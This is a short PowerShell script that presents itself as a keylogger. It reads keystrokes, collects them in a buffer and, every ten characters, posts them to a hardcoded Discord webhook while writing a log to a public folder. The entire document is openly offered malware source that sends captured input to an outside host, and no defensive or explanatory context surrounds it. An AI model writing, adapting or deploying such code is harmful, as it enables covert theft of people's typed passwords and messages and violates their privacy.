# Keylogger with Discord by DreadCipher
$webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"
$buffer = ""

while ($true) {
    Start-Sleep -Milliseconds 100
    if ([Console]::KeyAvailable) {
        $key = [Console]::ReadKey($true)
        $buffer += $key.Char
        if ($buffer.Length -ge 10) {
            try {
                $payload = @{ content = "Typed: $buffer" } | ConvertTo-Json
                Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
                "Sent '$buffer' at $(Get-Date)" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
                $buffer = ""
            } catch {
                "Error at $(Get-Date): $_" | Out-File -FilePath "C:\Users\Public\log.txt" -Append
            }
        }
    }
}
